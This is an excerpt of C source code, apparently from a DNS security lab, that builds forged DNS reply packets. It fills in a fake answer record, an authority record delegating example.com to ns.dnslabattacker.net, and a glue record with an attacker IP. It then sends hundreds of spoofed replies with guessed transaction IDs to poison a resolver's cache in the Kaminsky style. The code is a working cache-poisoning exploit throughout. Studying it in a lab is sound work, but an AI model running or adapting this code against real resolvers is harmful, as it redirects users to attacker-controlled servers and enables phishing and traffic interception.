...
int dnsReply(char* dst_ip, char* qdata, int qlength,unsigned short int transid)
{
// socket descriptor
    int sd;
...
//The flag you need to set, here is response
...
// 1 additional record:
    dns->ARCOUNT=htons(2);
// query_id is random:
    dns->query_id = htons(transid);

/////////////////////////////////////////////////////////////////////
// query section:

//no \0 !!!
    strncpy(data,qdata,qlength);    

//this is for convinience to get the struct type write the 4bytes in a more organized way.

    struct dataEnd * end=(struct dataEnd *)(data+qlength);
    end->type=htons(1);
    end->class=htons(1);
    int length = strlen(data)+sizeof(struct dataEnd)+1;

/////////////////////////////////////////////////////////////////////
// Answer section:

    unsigned short int* answer = (unsigned short int*)(data + length);
//set pointer position based on offset 0x0c
    *answer = htons(0xc00c);
//set Type class 
    end=(struct dataEnd *)(data+length+sizeof(short));
    end->type=htons(1);
    end->class=htons(1);

// set time to live
    unsigned int* ttl = (unsigned int*)(data + length + sizeof(short) + sizeof(struct dataEnd));
    *ttl = htons(0x100);
// data length 4 bytes
    unsigned short int* datalen = (unsigned short int*)(data + length + sizeof(short) + sizeof(struct dataEnd)+sizeof(int));
    *datalen = htons(4);
// ip address:
    unsigned int* ansIP = (unsigned int*)(data + length + 2*sizeof(short) + sizeof(struct dataEnd)+sizeof(int));
    *ansIP = htonl(0x1010101);
// set length of answer:
    int anslen =  2*sizeof(short) + sizeof(struct dataEnd) + 2*sizeof(int);
// update total length:
    length += anslen;
...
// Authoritative section:
    ...
    unsigned short int* auth= (unsigned short int*)(data + length);
// set 0x12 point to example.com
    *auth = htons(0xc012);          
...
// time to live
    ttl = (unsigned int*)(data + length + sizeof(short) + sizeof(struct dataEnd));
    *ttl = htons(0x100);

// data length
    datalen = (unsigned short int*)(data + length + sizeof(short) + sizeof(struct dataEnd) + sizeof(int));
    *datalen = htons(0x17);

// name server string:
    char* nsstr= data + length + 2*sizeof(short) + sizeof(struct dataEnd) + sizeof(int);

    strcpy(nsstr,"\2ns\16dnslabattacker\3net");     

    int nslength= strlen(nsstr)+1;
// length of authoritative nameservers section:
    int authlen= 2*sizeof(short) + sizeof(struct dataEnd) + sizeof(int) + nslength;
...
// first section:
// name server string:
    char* addstr= data + length;

    strcpy(addstr,"\2ns\16dnslabattacker\3net");
    int addlength= strlen(addstr)+1;                    

// set class type
    end=(struct dataEnd *)(data + length + addlength);
    end->type=htons(1);
    end->class=htons(1);
// time to live
    ttl = (unsigned int*)(data + length + addlength + sizeof(struct dataEnd));
    *ttl = htons(0x100);
// data length
    datalen = (unsigned short int*)(data + length + addlength + sizeof(struct dataEnd) + sizeof(int));
    *datalen = htons(4);
// ip address:
    ansIP = (unsigned int*)(data + length + addlength + sizeof(struct dataEnd) + sizeof(int) + sizeof(short));
//hex for 10.0.2.11
    *ansIP = htonl(0xa00020b);
// length of additional section:
    int addilen = addlength + sizeof(struct dataEnd) + 2*sizeof(int) + sizeof(short);
// update total payload length:
    length += addilen;

// second section:
    int* rule= (int*)(data + length);
    *rule=htonl(0x2910);
    int* rule1= (int*)(data + length + sizeof(int));
    *rule1=htonl(0x80);
    length += sizeof(int)+sizeof(short)+1;
...
***************************************************************************************/
    ...
    sin.sin_addr.s_addr = inet_addr("199.43.135.53"); // this is the second argument we input into the program
...
// send the packet out.
    if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&din, sizeof(din)) < 0)
...
// call reply function to send response:
        unsigned short int i=0;
        unsigned short int transid;
        transid = rand()%60000;
        sleep(0.05);
        for(i=0;i<300;i++)
            dnsReply(argv[2],data,length,transid+i);
        sleep(0.5);
    }
    close(sd);
    return 0;
